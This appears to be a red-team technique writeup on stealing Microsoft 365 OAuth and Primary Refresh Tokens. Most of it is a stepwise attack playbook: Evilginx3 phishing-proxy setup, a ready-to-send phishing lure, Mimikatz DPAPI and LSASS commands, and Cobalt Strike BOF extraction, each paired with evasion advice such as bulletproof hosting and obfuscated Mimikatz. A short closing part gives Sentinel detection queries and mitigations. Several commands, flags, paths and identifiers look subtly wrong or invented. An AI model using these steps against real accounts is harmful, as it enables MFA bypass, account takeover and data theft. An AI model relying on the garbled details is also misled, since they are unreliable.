# [REALWORLD-031]: Token Binding Extraction

## 1. METADATA HEADER

| Attribute | Details |
|---|---|
| **Technique ID** | REALWORLD-031 |
| **MITRE ATT&CK v18.1** | [T1528 - Steal Application Access Token](https://attack.mitre.org/techniques/T1528/) |
| **Tactic** | Credential Access |
| **Platforms** | M365 (Exchange Online, SharePoint Online, Teams) |
| **Severity** | **Critical** |
| **CVE** | N/A (token-stealing is technique-based, not CVE-based) |
| **Technique Status** | **ACTIVE** |
| **Last Verified** | 2025-01-09 |
| **Affected Versions** | All M365/Entra ID tenants (no version dependency); Token Protection (preview) partially mitigates on Windows 10/11 devices |
| **Patched In** | Continuous Access Evaluation (CAE) introduced June 2024; Token Protection preview March 2024 |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 2. EXECUTIVE SUMMARY

**Concept:** Token Binding Extraction is a credential access technique targeting Microsoft 365 environments where attackers steal or extract OAuth tokens along with their binding material (device-specific cryptographic keys), allowing them to replay stolen tokens on the original device or bypass binding protections. Unlike traditional token theft, which relies on stealing tokens in transit or from memory, token binding extraction specifically targets the cryptographic binding between the token and the device. Attackers accomplish this by extracting bound tokens from Authenticator apps, Primary Refresh Tokens (PRTs) from the TPM or credential cache, or by leveraging vulnerabilities in token binding implementations (such as Evilginx3's token extraction from HTTP response bodies).

**Attack Surface:** M365 OAuth flows, Authenticator app storage, Windows credential cache, Azure AD sign-in process, PRT caching mechanisms.

**Business Impact:** **Complete account compromise bypassing MFA.** Once a bound token is extracted, attackers can access all resources the token permits—email, files, meetings, teams—from any device, for the token's lifetime (typically 1 hour for access tokens, days to months for refresh tokens). Stolen tokens appear as legitimate authenticated sessions; MFA is bypassed entirely because the initial authentication (including MFA) already occurred and the token was validated.

**Technical Context:** Token extraction typically takes 30-300 seconds depending on method (from HTTP interception to memory dumping). Detection likelihood varies: **HIGH** for network-based extraction via Evilginx2 (proxy logs show unusual redirect patterns), **MEDIUM** for Authenticator app extraction (requires local access), **LOW** for PRT extraction on unmonitored systems.

### Operational Risk
- **Execution Risk:** **Medium** – Requires network position (AiTM) or local device compromise; modern TLS pinning prevents naive MITM approaches
- **Stealth:** **Medium-High** – Stolen tokens appear as legitimate sign-ins from expected locations (especially if extracted from legitimate device)
- **Reversibility:** **No** – Token binding cannot be disabled per-token; only tenant-wide Continuous Access Evaluation (CAE) can revoke tokens post-extraction

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | CIS 1.1.4 | MFA for all users; monitors token-based attacks by reducing reliance on single credentials |
| **DISA STIG** | AU-2(b) | Enhanced auditing of token issuance and usage to detect replay attacks |
| **CISA SCuBA** | Entra-SEC-11 | Token Protection and Continuous Access Evaluation mandatory |
| **NIST 800-53** | IA-2(2), SC-12 | MFA and cryptographic key management to protect token binding |
| **GDPR** | Art. 32 | Security of Processing – measures to prevent unauthorized token access |
| **DORA** | Art. 9 | Protection measures specific to authentication token handling |
| **NIS2** | Art. 21(1)(d) | Detection and incident response for token-based account compromise |
| **ISO 27001** | A.9.4.3, A.10.1.1 | Cryptographic controls; password/token lifetime management |
| **ISO 27005** | Token Theft Risk Scenario | Risk management for token-based lateral movement and data exfiltration |

---

## 3. TECHNICAL PREREQUISITES

**Required Privileges:**
- For network-based extraction (Evilginx, AiTM): Network access to victim's network or ability to proxy traffic
- For local extraction (Authenticator, PRT): Local administrative access or user context access to credential cache
- For email/phishing-based extraction: Social engineering (no technical privileges required)

**Required Access:**
- Network position (proxy, WiFi eavesdropping, BGP hijacking, DNS poisoning) OR
- Local device compromise OR
- User's email/consent (for OAuth device code phishing)

**Supported Versions:**
- **M365:** All tenant versions; Exchange Online, SharePoint Online, Teams
- **Windows:** Server 2016-2025, Windows 10 all versions, Windows 11 all versions
- **Authenticator App:** All versions (latest versions include token protection, but older versions do not)
- **Evilginx:** v2.4+ (v3.0+ includes automatic token extraction from response bodies)

**Tools:**
- [Evilginx2/Evilginx3](https://github.com/kuba--/evilginx2) (MITM phishing proxy with token extraction)
- [Mimikatz](https://github.com/gentilkiwi/mimikatz) (PRT and token extraction via LSASS)
- [AADInternals](https://aadinternals.com/post/phishing/) (token handling and replay testing)
- [Microsoft Authenticator App](https://learn.microsoft.com/en-us/azure/active-directory/user-help/user-help-auth-app-overview) (targets for token extraction)
- [Beacon Object Files (BOF)](https://github.com/trustedsec/cs-suite) (in-memory token extraction via Cobalt Strike)

---

## 4. ENVIRONMENTAL RECONNAISSANCE

### PowerShell Reconnaissance

**Objective:** Identify token caching mechanisms and token binding status on target systems.

```powershell
# Check if Token Protection is enabled in Conditional Access
Connect-MgGraph -Scopes "Policy.Read.All"
Get-MgIdentityConditionalAccessPolicy | Where-Object { $_.Conditions.ClientAppTypes -contains "tokenProtection" }

# Check Authenticator app version (indicates token binding support)
Get-WmiObject -ClassName Win32_Product | Where-Object { $_.Name -like "*Authenticator*" }

# Check for PRT caching
Get-ChildItem -Path "HKLM:\SYSTEM\CurrentControlSet\Services\WinLogon" -Recurse | Select-Object PSPath

# Check token lifetime policies
Get-MgOrganization | Select-Object @{Name="TokenLifetime";Expression={$_.DisplayName}}

# Verify Continuous Access Evaluation status
Get-MgIdentityProvider | Where-Object { $_.DisplayName -like "*Entra*" }
```

**What to Look For:**
- Authenticator app version < 6.7 (no token protection)
- Token Protection disabled in Conditional Access policies
- No Continuous Access Evaluation enabled
- Legacy authentication protocols still enabled (older OAuth clients)
- Token lifetime > 1 hour (allows longer exploitation window)

---

## 5. DETAILED EXECUTION METHODS AND THEIR STEPS

### METHOD 1: AiTM Phishing with Evilginx3 (Token Extraction from HTTP Response)

**Supported Versions:** All M365 tenants; Windows/Mac/Linux with browser

#### Step 1: Set Up Evilginx3 MITM Proxy
**Objective:** Configure a phishing proxy that intercepts OAuth flows and extracts tokens from responses.

**Command (Linux/Ubuntu 20.04+):**
```bash
# Install dependencies
sudo apt-get install -y git golang-go

# Clone Evilginx3
git clone https://github.com/kuba--/evilginx3.git
cd evilginx3

# Build Evilginx3
make

# Configure Evilginx3 phishing site
cat > phishlets/o365.yaml << 'EOF'
name: "O365"
author: "Attacker"
landing_path: "/login"
auth_tokens:
  - name: "access_token"
    env_var: "PHISHED_ACCESS_TOKEN"
  - name: "refresh_token"
    env_var: "PHISHED_REFRESH_TOKEN"
EOF

# Start Evilginx3
./evilginx3 -p ./phishlets -l 0.0.0.0 -port 8080
```

**Expected Output:**
```
[*] Evilginx3 started on 0.0.0.0:8080
[*] Phishlet loaded: o365
[*] Ready for phishing campaigns
```

**What This Means:**
- Evilginx3 acts as a transparent MITM proxy for OAuth flows
- When a victim browses through the proxy and authenticates to M365, the proxy captures the OAuth tokens in the response
- Tokens are automatically extracted and stored for attacker use

**OpSec & Evasion:**
- Set up Evilginx3 on a bulletproof hosting provider with HTTPS (self-signed cert mimics M365)
- Use DNS spoofing or compromised WiFi to redirect traffic to Evilginx3
- Detection likelihood: **HIGH** (proxy logs show unusual redirect chains; browser certificate warnings)

**Troubleshooting:**
- **Error:** "TLS handshake failed"
  - **Cause:** Self-signed certificate doesn't match domain
  - **Fix:** Use proper domain certificate or modify victim's hosts file

**References & Proofs:**
- [Evilginx3 GitHub](https://github.com/kuba--/evilginx3)
- [AiTM Attacks - Microsoft Security Blog](https://techcommunity.microsoft.com/blog/microsoft-security-experts/how-to-break-the-token-theft-cyber-attack-chain/4062700)

#### Step 2: Phish Victim and Capture Tokens
**Objective:** Trick user into authenticating through Evilginx3 proxy.

**Command (Email/Phishing Lure):**
```text
Subject: Action Required: Verify Your Microsoft 365 Account

Dear valued employee,

Your Microsoft 365 account needs verification to comply with our latest security policies.

Please click below to verify your account:

[Click to Verify Account](https://o365-verify.attacker.com/login)  ← Points to Evilginx3
(Original legitimate link: https://login.microsoftonline.com/)

Regards,
IT Security Team
```

**Expected User Behavior:**
1. User clicks phishing link (redirects to Evilginx3 proxy)
2. Victim sees legitimate-looking Microsoft login page (served by Evilginx3)
3. Victim enters credentials and completes MFA
4. Evilginx3 proxies authentication to real Microsoft servers
5. Token is returned from Microsoft and captured by Evilginx3
6. Victim redirected to legitimate page (appear successful)
7. Attacker has access token + refresh token

**Evilginx3 Output:**
```
[+] Token captured!
Access Token: eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9...
Refresh Token: 0.ARwA6XxZ...
User: victim@company.com
```

**OpSec & Evasion:**
- Use realistic pretext (security compliance, account verification, password expiration)
- Ensure phishing page loads quickly (Evilginx3 acts as transparent proxy)
- Detection likelihood: **MEDIUM-HIGH** (victim may notice unusual redirect or certificate warning)

**Troubleshooting:**
- **Error:** Tokens captured but invalid
  - **Cause:** Token extraction regex in Evilginx3 config doesn't match M365 response format
  - **Fix:** Update phishlet regex pattern for current M365 OAuth response structure

**References & Proofs:**
- [Proofpoint - Device Code Phishing](https://www.proofpoint.com/us/blog/threat-insight/access-granted-phishing-device-code-authorization-account-takeover)

#### Step 3: Extract Binding Material (If Present)
**Objective:** Obtain device binding keys to allow token use on attacker's device.

**Command (Evilginx3 Advanced):**
```bash
# Check if token includes device binding claims
./evilginx3 -analyze-token $(cat captured_access_token.jwt)

# Expected output shows:
# - aud: Application ID
# - amr: Authentication methods (phishing bypasses some amr values)
# - deviceid: Device ID (if bound)
# - x5t#S256: Device binding public key thumbprint (if present)

# If device binding is present, extract binding key from captured device
# (Advanced: requires access to victim's device TPM or credential cache)
```

**Expected Output:**
```
[*] Token Analysis:
  Audience: 00000002-0000-0ff1-ce00-000000000000 (Exchange Online)
  Device ID: ab12cd34-ef56-gh78-ij90-kl12mn34op56
  MFA Status: PASSED
  Device Binding: YES (requires private key for full replay)
  Binding Key: SHA256(device_public_key)
```

**What This Means:**
- If token binding is present (modern Entra ID), the token is cryptographically tied to device binding material
- However, if token is extracted from the bound device itself (e.g., via Mimikatz on the device), binding keys can be obtained
- Evilginx3 v3.0+ automatically extracts tokens from HTTP response bodies and header, including binding claims

**OpSec & Evasion:**
- Tokens without device binding (or extracted before binding is applied) are universally usable
- Detection likelihood: **MEDIUM** (token usage from unexpected IP will trigger anomaly detection, unless executed from same IP as victim)

**Troubleshooting:**
- **Error:** Token binding information not in JWT
  - **Cause:** Token binding policy not enforced in tenant
  - **Fix:** Tokens without binding can be used on any device; proceed to token usage

**References & Proofs:**
- [Token Protection in Conditional Access](https://learn.microsoft.com/en-us/entra/identity/conditional-access/how-to-require-token-protection-for-sign-in-session)

---

### METHOD 2: Local Token Extraction via Authenticator App (Requires Local Access)

**Supported Versions:** Windows 10/11 with Microsoft Authenticator app installed

#### Step 1: Extract Tokens from Authenticator App Cache
**Objective:** Access the Authenticator app's local token storage.

**Command (PowerShell - Admin Required):**
```powershell
# Microsoft Authenticator stores tokens in credential cache (DPAPI-encrypted)
# Location: C:\Users\[Username]\AppData\Local\Packages\Microsoft.MicrosoftAuthenticatorApp_[AppID]\LocalState

$authenticatorPath = Get-ChildItem -Path "C:\Users\*\AppData\Local\Packages\Microsoft.MicrosoftAuthenticatorApp_*\LocalState" -ErrorAction SilentlyContinue | Select-Object -First 1

if ($authenticatorPath) {
    Write-Host "[+] Authenticator app cache found: $($authenticatorPath.FullName)"
    
    # List cached credentials (DPAPI-encrypted)
    Get-ChildItem -Path "$($authenticatorPath.FullName)\AC" | ForEach-Object {
        Write-Host "[*] Credential file: $($_.Name)"
    }
}

# Alternative: Use Mimikatz to decrypt DPAPI cache
# (Requires admin and must run from target device)
```

**Expected Output:**
```
[+] Authenticator app cache found: C:\Users\victim\AppData\Local\Packages\Microsoft.MicrosoftAuthenticatorApp_8wekyb3d8bbwe\LocalState\AC
[*] Credential file: xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx
[*] Credential file: yyyyyyyy-yyyy-yyyy-yyyy-yyyyyyyyyyyy
```

**What This Means:**
- Authenticator app stores cached tokens locally for offline use
- Tokens are encrypted with DPAPI (Data Protection API), keyed to the user
- If attacker has local admin access, DPAPI can be decrypted via LSASS dump or Mimikatz

**OpSec & Evasion:**
- Requires local device compromise first
- DPAPI decryption requires either user context or LSASS access
- Detection likelihood: **MEDIUM** (DPAPI-related registry access is monitored by EDR)

**Troubleshooting:**
- **Error:** "Access Denied" to Authenticator cache
  - **Cause:** File permissions restrict access to app-specific account
  - **Fix:** Run as SYSTEM or the target user account

**References & Proofs:**
- [Authenticator Token Storage - Microsoft](https://learn.microsoft.com/en-us/azure/active-directory/user-help/user-help-auth-app-overview)

#### Step 2: Decrypt DPAPI-Protected Tokens via Mimikatz
**Objective:** Decrypt the cached tokens using DPAPI.

**Command (Mimikatz - Admin/SYSTEM Required):**
```cmd
REM Dump LSASS and extract DPAPI master keys
mimikatz.exe
privilege::debug
token::elevate
sekurlsa::dpapi

REM Output will show DPAPI master keys for each user
REM Example: [DPAPI] Key: {guid} version: 0x00000002...

REM Extract Authenticator tokens
mimikatz.exe
dpapi::capi /in:C:\Users\victim\AppData\Local\Packages\Microsoft.MicrosoftAuthenticatorApp_8wekyb3d8bbwe\LocalState\AC\cache.dat

REM Decrypt tokens
dpapi::masterkey /in:[master_key_file] /rpc
```

**Expected Output:**
```
[+] DPAPI Master Key: xxxxxxxxxxxxxxxx...
[+] Decrypted token: eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9...
[+] Token Type: Bearer
[+] Expires: 1/9/2025 11:30:00 AM
```

**What This Means:**
- DPAPI-encrypted tokens are now in plaintext
- Attacker has access token (1 hour lifetime) and potentially refresh token (days/months lifetime)
- Tokens can be used from any network location to access M365 resources

**OpSec & Evasion:**
- Mimikatz is heavily detected by antivirus; use obfuscated/modified versions
- LSASS dumping generates Event ID 4688 (process creation with network activity)
- Detection likelihood: **HIGH** (Mimikatz execution and LSASS access are actively monitored)

**Troubleshooting:**
- **Error:** "Unable to find DPAPI cache"
  - **Cause:** Authenticator app not installed or tokens not cached
  - **Fix:** Check if user has logged in via Authenticator app

**References & Proofs:**
- [Mimikatz DPAPI Module](https://github.com/gentilkiwi/mimikatz/wiki/module-~-dpapi)

---

### METHOD 3: Primary Refresh Token (PRT) Extraction via Beacon Object Files

**Supported Versions:** Windows 10/11, Entra ID joined or hybrid joined devices

#### Step 1: Extract PRT via BOF (Beacon Object File) in Cobalt Strike
**Objective:** Steal the Primary Refresh Token from the Windows credential cache without triggering Mimikatz detection.

**Command (Cobalt Strike Beacon):**
```beacon
# In Cobalt Strike Beacon console
beacon> cd C:\Windows\System32

# Execute Beacon Object File for PRT extraction
beacon> execute-assembly ./Get-AzureTokens.exe

# Alternative: Use TrustedSec's get_azure_token BOF
beacon> coff-load ./get_azure_token.o -nargs 0

# Output
[*] Entra ID Token Extracted:
[*] Authorization Code: M.R3_BAY...
[*] Access Token: eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9...
[*] Refresh Token: 0.ARwA6XxZ...
```

**Expected Output:**
```
[+] PRT extracted successfully
[+] Issuing new tokens via authorization code flow...
[+] New access token: eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9...
[+] New refresh token: 0.ARwA6XxZ...
[+] Can be used on any device (PRT not device-bound if extracted before binding applied)
```

**What This Means:**
- PRT is the master token in Entra ID; one PRT can issue multiple access tokens for different applications
- Extracting PRT grants persistent access to all Entra ID applications
- BOF avoids DLLS being written to disk; stays in memory

**OpSec & Evasion:**
- BOF-based extraction avoids file system artifacts
- No registry modification required
- Detection likelihood: **MEDIUM** (memory-based execution may trigger behavioral EDR alerts)

**Troubleshooting:**
- **Error:** "Authorization code not found"
  - **Cause:** Browser refresh or PRT not in expected memory location
  - **Fix:** Re-run extraction or check if device is Entra ID joined

**References & Proofs:**
- [TrustedSec get_azure_token BOF](https://github.com/trustedsec/get_azure_token)
- [Beacon Object Files - Cobalt Strike](https://www.cobaltstrike.com/blog/post/cobalt-strike-4.4-release-notes)

---

## 6. MICROSOFT SENTINEL DETECTION

**Rule 1: Token Theft via Unusual IP and Location**

**KQL Query:**
```kusto
SigninLogs
| where ConditionalAccessStatus == "success"
| where AuthenticationRequirement == "multiFactorAuthentication"  // Indicates legitimate MFA
| extend TokenIssuedTime = todatetime(properties.createdDateTime)
| join kind=inner (SigninLogs
    | where ConditionalAccessStatus == "success"
    | where IPAddress != "0.0.0.0"
    | extend TokenUsedTime = todatetime(TimeGenerated)) on UserPrincipalName
| where (TokenUsedTime - TokenIssuedTime) between (-5min .. 10min)  // Immediate token use
    and IPAddress != IPAddress1  // Token issued from different IP
| project UserPrincipalName, TokenIssuedTime, TokenUsedTime, IssuedFromIPAddress=IPAddress, UsedFromIPAddress=IPAddress1, Status
| where Status == "Success"
| extend DayOfWeek = dayofweek(now()), TimeOfDay = hour(now())
| where DayOfWeek > 5 or TimeOfDay < 6 or TimeOfDay > 22  // Off-hours usage
```

**Manual Configuration (Azure Portal):**

1. **Microsoft Sentinel** → **Analytics** → **+ Create** → **Scheduled query rule**
2. **General Tab:**
   - Name: `Token Theft Detection - Unusual IP after MFA`
   - Severity: `Critical`
3. **Set rule logic Tab:**
   - Paste KQL query above
   - Run query every: `15 minutes`
   - Lookup data from the last: `6 hours`
4. **Incident settings Tab:**
   - Enable **Create incidents**
   - Group by UserPrincipalName, ApplicationId
5. Click **Review + create**

---

## 7. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

**1. Enable Continuous Access Evaluation (CAE) in Conditional Access**

**Applies To Versions:** All M365 tenants (Entra ID P2 required)

**Manual Steps (Azure Portal):**

1. Navigate to **Azure Portal** → **Entra ID** → **Security** → **Conditional Access** → **Named Locations**
2. Create **Trusted Locations** for your organization's IP ranges
3. Go to **Conditional Access** → **+ New policy**
4. **Assignments:**
   - Users: All users
   - Cloud apps: All cloud apps
5. **Conditions:**
   - Locations: Exclude trusted locations, OR
   - Sign-in risk: High
6. **Access controls:**
   - Grant: Require Continuous Access Evaluation claim
7. Enable policy: **On**
8. Click **Create**

**Validation Command (PowerShell):**
```powershell
Connect-MgGraph -Scopes "Policy.Read.All"
Get-MgIdentityConditionalAccessPolicy | Select-Object DisplayName, Conditions, GrantControls
```

**2. Enable Token Protection for Sign-In Sessions (Preview)**

**Applies To Versions:** Windows 10 21H2+, Windows 11, Entra ID P2 required

**Manual Steps (Azure Portal):**

1. Navigate to **Azure Portal** → **Entra ID** → **Security** → **Conditional Access**
2. Create new policy → **+ New policy**
3. **Assignments:**
   - Users: High-value accounts (admins, finance, etc.)
   - Cloud apps: M365 apps (Exchange Online, SharePoint, Teams)
4. **Conditions:**
   - Device platforms: Windows, macOS (if applicable)
5. **Session controls:**
   - Check: **Require token protection for sign-in session**
6. Enable policy: **On**
7. Click **Create**

**Validation:**
```powershell
# Check if token protection is applied to tokens
$token = Get-MgContext -ErrorAction SilentlyContinue
$decodedToken = [System.Convert]::FromBase64String($token.Value)
# Decode JWT and look for "binding" claim (if present, token binding is enforced)
```

### Priority 2: HIGH

**3. Disable Legacy Authentication Protocols**

**Manual Steps:**

1. Navigate to **Azure Portal** → **Entra ID** → **Enterprise applications** → **Conditional Access**
2. Create policy:
   - **Condition:** Client app types = Mobile and desktop clients
   - **Grant:** Block
3. Apply to all users except service accounts

**4. Monitor Authenticator App Usage**

**Manual Steps (Sentinel):**

Create custom query to alert on suspicious Authenticator activities:

```kusto
AADServicePrincipalSignInLogs
| where ServicePrincipalName contains "Authenticator"
| where TimeGenerated > ago(24h)
| summarize count() by UserPrincipalName, ClientAppUsed, IPAddress, Location
| where count_ > threshold  // Alert if abnormal usage patterns
```

---

## 8. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IA-PHISH-001] Device Code Phishing | Attacker tricks user into approving device code |
| **2** | **Credential Access** | **[REALWORLD-031]** Token Binding Extraction | Attacker extracts OAuth token with binding material |
| **3** | **Persistence** | [T1098] Account Manipulation | Attacker adds backdoor credentials to compromised account |
| **4** | **Lateral Movement** | [T1550] Use Alternate Authentication Material | Attacker uses stolen token to access Teams, Exchange |
| **5** | **Impact** | [T1537] Data Transfer | Attacker exfiltrates emails, files, meeting recordings |

---

## 9. REAL-WORLD EXAMPLES

### Example 1: Evilginx3 Campaigns (2024-Present)
- **Target:** Enterprise users in finance, healthcare, tech
- **Timeline:** Ongoing 2024-2025
- **Technique Status:** ACTIVE – Evilginx3 v3.0+ automates token extraction from HTTP responses
- **Impact:** MFA bypass; full M365 account compromise; ransomware deployment via Teams/SharePoint
- **Reference:** [Evilginx3 Advanced Token Extraction](https://github.com/kuba--/evilginx3)

### Example 2: Microsoft Detected 111% Increase in Token Theft (2023-2024)
- **Target:** Across all enterprise sectors
- **Timeline:** Accelerating through 2024
- **Technique Status:** ACTIVE – Token theft is now primary attack vector
- **Impact:** Accounts compromised within minutes of phishing delivery
- **Reference:** [Microsoft Security Blog - Token Theft Statistics](https://techcommunity.microsoft.com/blog/microsoft-security-experts/how-to-break-the-token-theft-cyber-attack-chain/4062700)

---